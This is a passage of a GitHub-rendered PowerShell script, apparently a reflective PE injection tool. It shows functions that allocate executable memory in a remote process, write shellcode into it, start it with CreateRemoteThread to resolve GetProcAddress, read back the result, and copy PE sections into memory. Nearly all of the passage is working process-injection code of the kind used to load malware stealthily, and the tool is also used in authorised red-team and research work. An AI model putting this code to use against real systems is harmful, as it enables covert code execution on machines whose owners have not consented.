          <td id="LC1544" class="blob-code blob-code-inner js-file-line">		<span class="pl-c1">Write-BytesToMemory</span> <span class="pl-k">-</span>Bytes <span class="pl-smi">$GetProcAddressSC2</span> <span class="pl-k">-</span>MemoryAddress <span class="pl-smi">$SCPSMem</span></td>
        </tr>
        <tr>
          <td id="L1545" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1545"></td>
          <td id="LC1545" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$SCPSMem</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> <span class="pl-smi">$SCPSMem</span> (<span class="pl-smi">$GetProcAddressSC2<span class="pl-smi">.Length</span></span>)</td>
        </tr>
        <tr>
          <td id="L1546" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1546"></td>
          <td id="LC1546" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::StructureToPtr(<span class="pl-smi">$RFuncNamePtr</span><span class="pl-k">,</span> <span class="pl-smi">$SCPSMem</span><span class="pl-k">,</span> <span class="pl-c1">$false</span>)</td>
        </tr>
        <tr>
          <td id="L1547" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1547"></td>
          <td id="LC1547" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$SCPSMem</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> <span class="pl-smi">$SCPSMem</span> (<span class="pl-smi">$PtrSize</span>)</td>
        </tr>
        <tr>
          <td id="L1548" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1548"></td>
          <td id="LC1548" class="blob-code blob-code-inner js-file-line">		<span class="pl-c1">Write-BytesToMemory</span> <span class="pl-k">-</span>Bytes <span class="pl-smi">$GetProcAddressSC3</span> <span class="pl-k">-</span>MemoryAddress <span class="pl-smi">$SCPSMem</span></td>
        </tr>
        <tr>
          <td id="L1549" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1549"></td>
          <td id="LC1549" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$SCPSMem</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> <span class="pl-smi">$SCPSMem</span> (<span class="pl-smi">$GetProcAddressSC3<span class="pl-smi">.Length</span></span>)</td>
        </tr>
        <tr>
          <td id="L1550" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1550"></td>
          <td id="LC1550" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::StructureToPtr(<span class="pl-smi">$GetProcAddressAddr</span><span class="pl-k">,</span> <span class="pl-smi">$SCPSMem</span><span class="pl-k">,</span> <span class="pl-c1">$false</span>)</td>
        </tr>
        <tr>
          <td id="L1551" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1551"></td>
          <td id="LC1551" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$SCPSMem</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> <span class="pl-smi">$SCPSMem</span> (<span class="pl-smi">$PtrSize</span>)</td>
        </tr>
        <tr>
          <td id="L1552" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1552"></td>
          <td id="LC1552" class="blob-code blob-code-inner js-file-line">		<span class="pl-c1">Write-BytesToMemory</span> <span class="pl-k">-</span>Bytes <span class="pl-smi">$GetProcAddressSC4</span> <span class="pl-k">-</span>MemoryAddress <span class="pl-smi">$SCPSMem</span></td>
        </tr>
        <tr>
          <td id="L1553" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1553"></td>
          <td id="LC1553" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$SCPSMem</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> <span class="pl-smi">$SCPSMem</span> (<span class="pl-smi">$GetProcAddressSC4<span class="pl-smi">.Length</span></span>)</td>
        </tr>
        <tr>
          <td id="L1554" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1554"></td>
          <td id="LC1554" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::StructureToPtr(<span class="pl-smi">$GetProcAddressRetMem</span><span class="pl-k">,</span> <span class="pl-smi">$SCPSMem</span><span class="pl-k">,</span> <span class="pl-c1">$false</span>)</td>
        </tr>
        <tr>
          <td id="L1555" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1555"></td>
          <td id="LC1555" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$SCPSMem</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> <span class="pl-smi">$SCPSMem</span> (<span class="pl-smi">$PtrSize</span>)</td>
        </tr>
        <tr>
          <td id="L1556" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1556"></td>
          <td id="LC1556" class="blob-code blob-code-inner js-file-line">		<span class="pl-c1">Write-BytesToMemory</span> <span class="pl-k">-</span>Bytes <span class="pl-smi">$GetProcAddressSC5</span> <span class="pl-k">-</span>MemoryAddress <span class="pl-smi">$SCPSMem</span></td>
        </tr>
        <tr>
          <td id="L1557" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1557"></td>
          <td id="LC1557" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$SCPSMem</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> <span class="pl-smi">$SCPSMem</span> (<span class="pl-smi">$GetProcAddressSC5<span class="pl-smi">.Length</span></span>)</td>
        </tr>
        <tr>
          <td id="L1558" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1558"></td>
          <td id="LC1558" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1559" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1559"></td>
          <td id="LC1559" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$RSCAddr</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.VirtualAllocEx.Invoke</span></span>(<span class="pl-smi">$RemoteProcHandle</span><span class="pl-k">,</span> [<span class="pl-k">IntPtr</span>]::Zero<span class="pl-k">,</span> [<span class="pl-k">UIntPtr</span>][<span class="pl-k">UInt64</span>]<span class="pl-smi">$SCLength</span><span class="pl-k">,</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.MEM_COMMIT</span></span> <span class="pl-k">-bor</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.MEM_RESERVE</span></span><span class="pl-k">,</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.PAGE_EXECUTE_READWRITE</span></span>)</td>
        </tr>
        <tr>
          <td id="L1560" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1560"></td>
          <td id="LC1560" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> (<span class="pl-smi">$RSCAddr</span> <span class="pl-k">-eq</span> [<span class="pl-k">IntPtr</span>]::Zero)</td>
        </tr>
        <tr>
          <td id="L1561" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1561"></td>
          <td id="LC1561" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L1562" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1562"></td>
          <td id="LC1562" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Unable to allocate memory in the remote process for shellcode<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L1563" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1563"></td>
          <td id="LC1563" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L1564" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1564"></td>
          <td id="LC1564" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">UIntPtr</span>]<span class="pl-smi">$NumBytesWritten</span> <span class="pl-k">=</span> [<span class="pl-k">UIntPtr</span>]::Zero</td>
        </tr>
        <tr>
          <td id="L1565" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1565"></td>
          <td id="LC1565" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Success</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.WriteProcessMemory.Invoke</span></span>(<span class="pl-smi">$RemoteProcHandle</span><span class="pl-k">,</span> <span class="pl-smi">$RSCAddr</span><span class="pl-k">,</span> <span class="pl-smi">$SCPSMemOriginal</span><span class="pl-k">,</span> [<span class="pl-k">UIntPtr</span>][<span class="pl-k">UInt64</span>]<span class="pl-smi">$SCLength</span><span class="pl-k">,</span> [<span class="pl-k">Ref</span>]<span class="pl-smi">$NumBytesWritten</span>)</td>
        </tr>
        <tr>
          <td id="L1566" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1566"></td>
          <td id="LC1566" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> ((<span class="pl-smi">$Success</span> <span class="pl-k">-eq</span> <span class="pl-c1">$false</span>) <span class="pl-k">-or</span> ([<span class="pl-k">UInt64</span>]<span class="pl-smi">$NumBytesWritten</span> <span class="pl-k">-ne</span> [<span class="pl-k">UInt64</span>]<span class="pl-smi">$SCLength</span>))</td>
        </tr>
        <tr>
          <td id="L1567" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1567"></td>
          <td id="LC1567" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L1568" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1568"></td>
          <td id="LC1568" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Unable to write shellcode to remote process memory.<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L1569" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1569"></td>
          <td id="LC1569" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L1570" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1570"></td>
          <td id="LC1570" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1571" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1571"></td>
          <td id="LC1571" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$RThreadHandle</span> <span class="pl-k">=</span> Create<span class="pl-k">-</span>RemoteThread <span class="pl-k">-</span>ProcessHandle <span class="pl-smi">$RemoteProcHandle</span> <span class="pl-k">-</span>StartAddress <span class="pl-smi">$RSCAddr</span> <span class="pl-k">-</span>Win32Functions <span class="pl-smi">$Win32Functions</span></td>
        </tr>
        <tr>
          <td id="L1572" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1572"></td>
          <td id="LC1572" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Result</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.WaitForSingleObject.Invoke</span></span>(<span class="pl-smi">$RThreadHandle</span><span class="pl-k">,</span> <span class="pl-c1">20000</span>)</td>
        </tr>
        <tr>
          <td id="L1573" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1573"></td>
          <td id="LC1573" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> (<span class="pl-smi">$Result</span> <span class="pl-k">-ne</span> <span class="pl-c1">0</span>)</td>
        </tr>
        <tr>
          <td id="L1574" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1574"></td>
          <td id="LC1574" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L1575" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1575"></td>
          <td id="LC1575" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Call to CreateRemoteThread to call GetProcAddress failed.<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L1576" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1576"></td>
          <td id="LC1576" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L1577" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1577"></td>
          <td id="LC1577" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1578" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1578"></td>
          <td id="LC1578" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>The process address is written to memory in the remote process at address $GetProcAddressRetMem, read this memory</span></td>
        </tr>
        <tr>
          <td id="L1579" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1579"></td>
          <td id="LC1579" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$ReturnValMem</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::AllocHGlobal(<span class="pl-smi">$PtrSize</span>)</td>
        </tr>
        <tr>
          <td id="L1580" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1580"></td>
          <td id="LC1580" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Result</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.ReadProcessMemory.Invoke</span></span>(<span class="pl-smi">$RemoteProcHandle</span><span class="pl-k">,</span> <span class="pl-smi">$GetProcAddressRetMem</span><span class="pl-k">,</span> <span class="pl-smi">$ReturnValMem</span><span class="pl-k">,</span> [<span class="pl-k">UIntPtr</span>][<span class="pl-k">UInt64</span>]<span class="pl-smi">$PtrSize</span><span class="pl-k">,</span> [<span class="pl-k">Ref</span>]<span class="pl-smi">$NumBytesWritten</span>)</td>
        </tr>
        <tr>
          <td id="L1581" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1581"></td>
          <td id="LC1581" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> ((<span class="pl-smi">$Result</span> <span class="pl-k">-eq</span> <span class="pl-c1">$false</span>) <span class="pl-k">-or</span> (<span class="pl-smi">$NumBytesWritten</span> <span class="pl-k">-eq</span> <span class="pl-c1">0</span>))</td>
        </tr>
        <tr>
          <td id="L1582" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1582"></td>
          <td id="LC1582" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L1583" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1583"></td>
          <td id="LC1583" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Call to ReadProcessMemory failed<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L1584" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1584"></td>
          <td id="LC1584" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L1585" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1585"></td>
          <td id="LC1585" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$ProcAddress</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::PtrToStructure(<span class="pl-smi">$ReturnValMem</span><span class="pl-k">,</span> [<span class="pl-k">Type</span>][<span class="pl-k">IntPtr</span>])</td>
        </tr>
        <tr>
          <td id="L1586" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1586"></td>
          <td id="LC1586" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L1587" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1587"></td>
          <td id="LC1587" class="blob-code blob-code-inner js-file-line">        <span class="pl-c"><span class="pl-c">#</span>Cleanup remote process memory</span></td>
        </tr>
        <tr>
          <td id="L1588" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1588"></td>
          <td id="LC1588" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Functions<span class="pl-smi">.VirtualFreeEx.Invoke</span></span>(<span class="pl-smi">$RemoteProcHandle</span><span class="pl-k">,</span> <span class="pl-smi">$RSCAddr</span><span class="pl-k">,</span> [<span class="pl-k">UIntPtr</span>][<span class="pl-k">UInt64</span>]<span class="pl-c1">0</span><span class="pl-k">,</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.MEM_RELEASE</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L1589" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1589"></td>
          <td id="LC1589" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Functions<span class="pl-smi">.VirtualFreeEx.Invoke</span></span>(<span class="pl-smi">$RemoteProcHandle</span><span class="pl-k">,</span> <span class="pl-smi">$GetProcAddressRetMem</span><span class="pl-k">,</span> [<span class="pl-k">UIntPtr</span>][<span class="pl-k">UInt64</span>]<span class="pl-c1">0</span><span class="pl-k">,</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.MEM_RELEASE</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L1590" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1590"></td>
          <td id="LC1590" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L1591" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1591"></td>
          <td id="LC1591" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> (<span class="pl-k">-not</span> <span class="pl-smi">$LoadByOrdinal</span>)</td>
        </tr>
        <tr>
          <td id="L1592" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1592"></td>
          <td id="LC1592" class="blob-code blob-code-inner js-file-line">        {</td>
        </tr>
        <tr>
          <td id="L1593" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1593"></td>
          <td id="LC1593" class="blob-code blob-code-inner js-file-line">            <span class="pl-smi">$Win32Functions<span class="pl-smi">.VirtualFreeEx.Invoke</span></span>(<span class="pl-smi">$RemoteProcHandle</span><span class="pl-k">,</span> <span class="pl-smi">$RFuncNamePtr</span><span class="pl-k">,</span> [<span class="pl-k">UIntPtr</span>][<span class="pl-k">UInt64</span>]<span class="pl-c1">0</span><span class="pl-k">,</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.MEM_RELEASE</span></span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L1594" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1594"></td>
          <td id="LC1594" class="blob-code blob-code-inner js-file-line">        }</td>
        </tr>
        <tr>
          <td id="L1595" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1595"></td>
          <td id="LC1595" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1596" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1596"></td>
          <td id="LC1596" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">return</span> <span class="pl-smi">$ProcAddress</span></td>
        </tr>
        <tr>
          <td id="L1597" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1597"></td>
          <td id="LC1597" class="blob-code blob-code-inner js-file-line">	}</td>
        </tr>
        <tr>
          <td id="L1598" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1598"></td>
          <td id="LC1598" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L1599" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1599"></td>
          <td id="LC1599" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L1600" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1600"></td>
          <td id="LC1600" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">Function</span> <span class="pl-en">Copy-Sections</span></td>
        </tr>
        <tr>
          <td id="L1601" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1601"></td>
          <td id="LC1601" class="blob-code blob-code-inner js-file-line">	{</td>
        </tr>
        <tr>
          <td id="L1602" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1602"></td>
          <td id="LC1602" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">Param</span>(</td>
        </tr>
        <tr>
          <td id="L1603" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1603"></td>
          <td id="LC1603" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">0</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L1604" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1604"></td>
          <td id="LC1604" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">Byte</span>[]]</td>
        </tr>
        <tr>
          <td id="L1605" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1605"></td>
          <td id="LC1605" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$PEBytes</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L1606" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1606"></td>
          <td id="LC1606" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1607" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1607"></td>
          <td id="LC1607" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">1</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L1608" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1608"></td>
          <td id="LC1608" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">System.Object</span>]</td>
        </tr>
        <tr>
          <td id="L1609" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1609"></td>
          <td id="LC1609" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$PEInfo</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L1610" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1610"></td>
          <td id="LC1610" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1611" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1611"></td>
          <td id="LC1611" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">2</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L1612" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1612"></td>
          <td id="LC1612" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">System.Object</span>]</td>
        </tr>
        <tr>
          <td id="L1613" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1613"></td>
          <td id="LC1613" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Functions</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L1614" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1614"></td>
          <td id="LC1614" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1615" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1615"></td>
          <td id="LC1615" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">3</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L1616" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1616"></td>
          <td id="LC1616" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">System.Object</span>]</td>
        </tr>
        <tr>
          <td id="L1617" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1617"></td>
          <td id="LC1617" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Types</span></td>
        </tr>
        <tr>
          <td id="L1618" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1618"></td>
          <td id="LC1618" class="blob-code blob-code-inner js-file-line">		)</td>
        </tr>
        <tr>
          <td id="L1619" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1619"></td>
          <td id="LC1619" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1620" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1620"></td>
          <td id="LC1620" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">for</span>( <span class="pl-smi">$i</span> <span class="pl-k">=</span> <span class="pl-c1">0</span>; <span class="pl-smi">$i</span> <span class="pl-k">-lt</span> <span class="pl-smi">$PEInfo<span class="pl-smi">.IMAGE_NT_HEADERS.FileHeader.NumberOfSections</span></span>; <span class="pl-smi">$i</span><span class="pl-k">++</span>)</td>
        </tr>
        <tr>
          <td id="L1621" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1621"></td>
          <td id="LC1621" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L1622" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1622"></td>
          <td id="LC1622" class="blob-code blob-code-inner js-file-line">			[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$SectionHeaderPtr</span> <span class="pl-k">=</span> [<span class="pl-k">IntPtr</span>](<span class="pl-c1">Add-SignedIntAsUnsigned</span> ([<span class="pl-k">Int64</span>]<span class="pl-smi">$PEInfo<span class="pl-smi">.SectionHeaderPtr</span></span>) (<span class="pl-smi">$i</span> <span class="pl-k">*</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::SizeOf([<span class="pl-k">Type</span>]<span class="pl-smi">$Win32Types<span class="pl-smi">.IMAGE_SECTION_HEADER</span></span>)))</td>
        </tr>
        <tr>
          <td id="L1623" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1623"></td>
          <td id="LC1623" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$SectionHeader</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::PtrToStructure(<span class="pl-smi">$SectionHeaderPtr</span><span class="pl-k">,</span> [<span class="pl-k">Type</span>]<span class="pl-smi">$Win32Types<span class="pl-smi">.IMAGE_SECTION_HEADER</span></span>)</td>
        </tr>
        <tr>
          <td id="L1624" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1624"></td>
          <td id="LC1624" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1625" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1625"></td>
          <td id="LC1625" class="blob-code blob-code-inner js-file-line">			<span class="pl-c"><span class="pl-c">#</span>Address to copy the section to</span></td>
        </tr>
        <tr>
          <td id="L1626" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1626"></td>
          <td id="LC1626" class="blob-code blob-code-inner js-file-line">			[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$SectionDestAddr</span> <span class="pl-k">=</span> [<span class="pl-k">IntPtr</span>](<span class="pl-c1">Add-SignedIntAsUnsigned</span> ([<span class="pl-k">Int64</span>]<span class="pl-smi">$PEInfo<span class="pl-smi">.PEHandle</span></span>) ([<span class="pl-k">Int64</span>]<span class="pl-smi">$SectionHeader<span class="pl-smi">.VirtualAddress</span></span>))</td>
        </tr>
        <tr>
          <td id="L1627" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1627"></td>
          <td id="LC1627" class="blob-code blob-code-inner js-file-line">			</td>
        </tr>
        <tr>
          <td id="L1628" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1628"></td>
          <td id="LC1628" class="blob-code blob-code-inner js-file-line">			<span class="pl-c"><span class="pl-c">#</span>SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated</span></td>
        </tr>
        <tr>
          <td id="L1629" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1629"></td>
          <td id="LC1629" class="blob-code blob-code-inner js-file-line">			<span class="pl-c"><span class="pl-c">#</span>    in memory for the section. If VirtualSize &gt; SizeOfRawData, pad the extra spaces with 0. If</span></td>
        </tr>
        <tr>
